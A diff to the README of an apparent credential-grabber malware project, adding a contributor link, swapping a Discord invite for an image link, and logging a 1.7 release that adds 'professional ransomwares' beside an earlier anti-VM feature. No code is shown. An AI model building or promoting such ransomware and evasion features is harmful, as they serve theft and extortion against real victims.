@@ -42,15 +42,17 @@
   **[<kbd> <br> gumbobr0t's Telegram <br> </kbd>][gumbobr0t's Telegram]** 
   **[<kbd> <br> pierro on GitHub <br> </kbd>][pierro on GitHub]** 
   **[<kbd> <br> gumbobr0t on GitHub <br> </kbd>][gumbobr0t on GitHub]**
-
+  **[<kbd> <br> killer on GitHub <br> </kbd>][killer on GitHub]**
+  
   ---
 </div>
 
-[Discord Server]: https://discord.gg/PaE8MBQz4K
+[Discord Server]: https://github.com/DamagingRose/Rose-Grabber/blob/main/components/assets/roseontop.jpg
 [Telegram Group]: https://t.me/+7MDF550ZlLVhYjUy
 [gumbobr0t's Telegram]: https://t.me/gumbobr0t
 [pierro on GitHub]: https://github.com/xpierroz
 [gumbobr0t on GitHub]: https://github.com/gumbobr0t
+[killer on GitHub]: https://github.com/Minecraftkillir
 
 ## Features
 
@@ -117,6 +119,10 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 </div>
 
 ## Changelog
+
+- **1.7 (2023-08-14)**
+  - Added professional ransomwares
+  - Fixed return zip file
 
 - **1.6 (2023-08-14)**
   - Added Anti-VM
